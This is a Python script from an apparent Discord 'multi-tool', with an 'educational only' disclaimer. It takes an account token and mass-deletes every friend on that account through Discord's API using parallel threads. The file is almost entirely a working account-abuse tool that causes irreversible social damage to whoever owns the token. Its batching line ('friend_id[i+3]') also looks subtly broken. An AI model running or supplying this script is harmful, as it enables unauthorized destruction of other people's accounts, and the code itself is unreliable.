# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import threading
except Exception as e:
    MissingModule(e)

Title("Discord Token Delete Friends")
Connection()

try:
    token = ChoiceToken()

    print(f"{LOADING} Deleting Friends..", reset)

    def DeleteFriends(token, friends):
        for friend in friends:
            try:
                response = requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': token})
                if response.status_code == 204 or response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Deleted {white}| Username:{red} {friend['user']['username']}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Username:{red} {friend['user']['username']}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Username:{red} {friend['user']['username']}", reset)

    processes = []
    friend_id = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': token, 'Content-Type': 'application/json'}).json()
    if not friend_id:
        print(f"{ERROR} No Friends found!", reset)

    for friends in [friend_id[i+3] for i in range(0, len(friend_id), 3)]:
        t = threading.Thread(target=DeleteFriends, args=(token, friends))
        t.start()
        processes.append(t)
    for process in processes:
        process.join()

    Continue()
    Reset()

except Exception as e:
    Error(e)